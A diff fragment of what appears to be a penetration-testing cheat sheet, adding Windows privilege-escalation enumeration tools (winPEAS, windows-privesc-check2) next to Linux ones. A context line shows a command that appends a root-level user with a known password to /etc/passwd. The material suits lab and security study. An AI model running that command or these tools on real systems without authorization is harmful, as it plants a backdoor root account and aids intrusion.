@@ -43,8 +43,7 @@ ls -la /etc/passwd
 echo "okays:$(openssl passwd okay2):0:0:root:/root:/usr/bin/bash" >> /etc/passwd
 ```
 
-### Enumeration Automated
-
+### Linux Enumeration Tools 
 #### Unix Privesc Check
 ```
 ./unix-privesc-check
@@ -56,6 +55,17 @@ https://pentestmonkey.net/tools/audit/unix-privesc-check
 ./linpeas.sh
 ```
 https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+
+### Windows Enumeration Tools
+
+```
+winpeas.exe
+```
+https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
+```
+windows-privesc-check2.exe --dump -G
+```
+https://github.com/pentestmonkey/windows-privesc-check
 
 ## Client-Side Attacks
 ### HTA Attack in Action
